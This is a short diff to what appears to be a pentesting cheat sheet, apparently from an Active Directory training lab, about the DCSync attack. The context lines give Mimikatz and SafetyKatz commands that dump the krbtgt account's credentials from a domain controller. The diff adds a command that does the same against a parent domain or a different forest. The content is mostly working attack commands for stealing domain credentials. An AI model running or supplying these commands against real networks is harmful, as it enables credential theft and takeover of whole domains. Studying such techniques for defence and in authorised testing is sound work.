@@ -7,6 +7,9 @@ Need **Domain Admin**, **Enterprise Admin** or **Domain Controller** privilege t
 Invoke-Mimikatz -Command '"lsadump::dcsync /user:dcorp\krbtgt"' 
 
 SafetyKatz.exe "lsadump::dcsync /user:dcorp\krbtgt" "exit"
+
+# For parent domain or different forest
+SafetyKatz.exe "lsadump::dcsync /user:mcorp\krbtgt /domain:moneycorp.local" "exit"
 ```
 {% endcode %}
 
